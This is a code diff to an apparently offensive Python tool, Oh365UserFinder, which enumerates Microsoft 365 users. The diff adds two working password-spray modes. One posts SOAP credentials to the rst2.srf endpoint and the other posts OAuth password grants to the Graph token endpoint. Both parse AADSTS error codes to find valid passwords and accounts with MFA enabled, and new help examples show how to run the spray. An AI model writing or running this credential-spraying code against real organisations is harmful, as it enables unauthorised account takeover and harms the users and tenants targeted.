@@ -22,7 +22,7 @@ def banner():
     print(" / / / / __ \ /_ </ __ \/___ \   / / / / ___/ _ \/ ___/  / /_  / / __ \/ __  / _ \/ ___/ ")
     print("/ /_/ / / / /__/ / /_/ /___/ /  / /_/ (__  )  __/ /     / __/ / / / / / /_/ /  __/ /     ")
     print("\____/_/ /_/____/\____/_____/   \____/____/\___/_/     /_/   /_/_/ /_/\__,_/\___/_/     \n")
-    print("                                   Version 1.0.2                                         ")
+    print("                                   Version 1.1.0                                         ")
     print("                               A project by The Mayor                                    ")
     print("                        Oh365UserFinder.py -h to get started                            \n" + Style.RESET_ALL)
     print("-" * 90)
@@ -30,11 +30,22 @@ def banner():
 
 def options():
     opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
-        '''Example: python3 Oh365UserFinder.py -e test@test.com
-Example: python3 Oh365UserFinder.py -r testemails.txt -w valid.txt --verbose
-Example: python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30 --verbose
-Example: python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30
-Example: python3 Oh365Finder.py -d mayorsec.com
+        '''---Validate a Domain Name in O365---
+python3 Oh365Finder.py -d mayorsec.com\n
+---Validate a single email---
+python3 Oh365UserFinder.py -e test@test.com\n
+---Validate a list of emails and write to file---
+python3 Oh365UserFinder.py -r testemails.txt -w valid.txt\n
+---Validate a list of emails, write to file and timeout between requests---
+python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30\n
+---Validate a list of emails and write to CSV---
+python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30\n
+---Password Spray a list of emails---
+python3 Oh365UserFinder.py -r -p <password> --pwspray --elist <listname>\n
+---Password Spray a list of emails using GRAPH--- (Can be used to identify valid account credentials with MFA enabled)
+python3 Oh365UserFinder.py -r -p <password> --gspray --elist <listname>\n
+
+
 '''))
     opt_parser.add_argument(
         '-e', '--email', help='Runs o365UserFinder against a single email')
@@ -50,6 +61,12 @@ Example: python3 Oh365Finder.py -d mayorsec.com
         '-d', '--domain', help='Validate if a domain exists')
     opt_parser.add_argument(
         '-v', '--verbose', help='Prints output verbosely', action='store_true')
+    opt_parser.add_argument(
+        '-gs', '--gspray', help='Password sprays a list of accounts using GRAPH', action='store_true')
+    opt_parser.add_argument(
+        '-ps', '--pwspray', help='Password sprays a list of accounts using RST', action='store_true')
+    opt_parser.add_argument('-p', '--password', help='Password to be tested')
+    opt_parser.add_argument('-el', '--elist', help='Valid emails to be tested')
     global args
     args = opt_parser.parse_args()
     if len(sys.argv) == 1:
@@ -148,7 +165,7 @@ def main():
                             print(info + f'\nContinuing scan in 30 seconds.')
                             time.sleep(int(30))
                             timeout_counter = 0
-                            #sys.exit()
+                            # sys.exit()
                         else:
                             print(
                                 fail + f"\n[warn] Results suggest O365 is responding with false positives. Sleeping for {args.timeout} seconds before trying again.\n")
@@ -183,7 +200,9 @@ def main():
         url = (
             f"https://login.microsoftonline.com/getuserrealm.srf?login=user@{domain_name}")
         request = o365request.get(url)
+        print(request)
         response = request.text
+        print(response)
         valid_response = re.search('"NameSpaceType":"Managed",', response)
         if args.verbose:
             print(domain_name, request, response, valid_response)
@@ -194,6 +213,121 @@ def main():
             print(
                 fail + f"[info] The listed domain {domain_name} does not exist.\n" + close)
         print(info + f'[info] Scan completed at {time.ctime()}' + close)
+
+    elif args.pwspray:
+        with open(args.elist) as input_emails:
+            for line in input_emails:
+                email_line = line.split()
+                email = ' '.join(email_line)
+                password = args.password
+                s = o365request.session()
+                body = '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>' + \
+                    email + '</wsse:Username><wsse:Password>' + password + '</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>'
+                requestURL = 'https://login.microsoftonline.com/rst2.srf'
+                request = o365request.post(requestURL, data=body)
+                response = request.text
+                valid_response = re.search('AADSTS53003', response)
+                account_doesnt_exist = re.search('AADSTS50034', response)
+                account_invalid_password = re.search(
+                    'AADSTS50126', response)
+                if valid_response:
+                    counter = counter + 1
+                    s = o365request.session()
+                    body = 'grant_type=password&password=' + password + '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
+                        email + '&resource=https://graph.windows.net&client_info=1&scope=openid'
+                    requestURL = "https://login.microsoft.com/common/oauth2/token"
+                    request = o365request.post(requestURL, data=body)
+                    response = request.text
+                    mfa_true = re.search('50076', response)
+                    if mfa_true:
+                        b = "Result - VALID PASSWORD - MFA ENABLED [+]"
+                        print(
+                            success + f"[+] {email:52} {b}" + close)
+                    else:
+                        b = success + "Result -" + " " * \
+                            10 + "VALID PASSWORD! [+]"
+                        print(
+                            success + f"[+] {email:56} {b}" + close)
+                if account_doesnt_exist:
+                    b = "Result - " + " "*12 + "Invalid Account! [-]"
+                    print(fail + f"[-] {email:52} {b}" + close)
+                if account_invalid_password:
+                    a = email
+                    b = " Result - " + " "*8 + "Invalid Credentials! [-]"
+                    print(fail + f"[-] {email:51} {b}" + close)
+                if args.timeout is not None:
+                    time.sleep(int(args.timeout))
+            if counter == 0:
+                print(
+                    fail + '\n[-] There were no valid logins found. [-]' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
+            elif counter == 1:
+                print(
+                    info + '\n[info] Oh365 User Finder discovered one valid credential pair.' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
+            else:
+                print(
+                    info + f'\n[info] Oh365 User Finder discovered {counter} valid credential pairs.\n' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
+    elif args.gspray:
+        with open(args.elist) as input_emails:
+            for line in input_emails:
+                email_line = line.split()
+                email = ' '.join(email_line)
+                password = args.password
+                s = o365request.session()
+                body = 'grant_type=password&password=' + password + '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
+                    email + '&resource=https://graph.windows.net&client_info=1&scope=openid'
+                requestURL = "https://login.microsoft.com/common/oauth2/token"
+                request = o365request.post(requestURL, data=body)
+                response = request.text
+                valid_response = re.search('53003', response)
+                account_doesnt_exist = re.search('50034', response)
+                account_invalid_password = re.search('50126', response)
+                valid_response1 = re.search('7000218', response)
+                mfa_true = re.search('50076', response)
+                if valid_response:
+                    counter = counter + 1
+                    b = success + "Result - " + " "*12 + "VALID PASSWORD! [+]"
+                    print(
+                        success + f"[+] {email:52} {b}" + close)
+                if valid_response1:
+                    counter = counter + 1
+                    b = success + "Result - " + " "*12 + "VALID PASSWORD! [+]"
+                    print(
+                        success + f"[+] {email:52} {b}" + close)
+                if account_doesnt_exist:
+                    b = " Result - " + " "*12 + "Invalid Account! [-]"
+                    print(fail + f"[-] {email:51} {b}" + close)
+                if account_invalid_password:
+                    a = email
+                    b = " Result - " + " "*8 + "Invalid Credentials! [-]"
+                    print(fail + f"[-] {email:51} {b}" + close)
+                if mfa_true:
+                    counter = counter + 1
+                    a = email
+                    b = "Result - VALID PASSWORD - MFA ENABLED [+]"
+                    print(success + f"[+] {email:52} {b}" + close)
+                if args.timeout is not None:
+                    time.sleep(int(args.timeout))
+            if counter == 0:
+                print(
+                    fail + '\n[-] There were no valid logins found. [-]' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
+            elif counter == 1:
+                print(
+                    info + '\n[info] Oh365 User Finder discovered one valid credential pair.' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
+            else:
+                print(
+                    info + f'\n[info] Oh365 User Finder discovered {counter} valid credential pairs.\n' + close)
+                print(
+                    info + f'\n[info] Scan completed at {time.ctime()}' + close)
     else:
         sys.exit()
 
